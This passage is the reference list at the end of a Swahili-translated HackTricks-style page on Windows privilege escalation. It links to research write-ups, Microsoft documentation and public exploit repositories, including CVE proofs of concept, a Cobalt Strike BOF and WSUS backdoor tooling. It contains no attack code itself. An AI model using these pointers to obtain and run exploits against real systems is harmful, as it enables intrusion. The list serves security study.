- [16] [Zana za kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zikiwa zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha hali za race za CLDFLT na DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kutawala Zote: Primitive kamili ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya ufutaji wa faili holela ili kuongeza privileges na mbinu nyingine bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation iliyogunduliwa hivi karibuni](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa funguo za Ssh Private kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kugeuza seva za masasisho za Enterprise kuwa viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kugeuza seva za masasisho za Enterprise kuwa viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia ufutaji wa folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
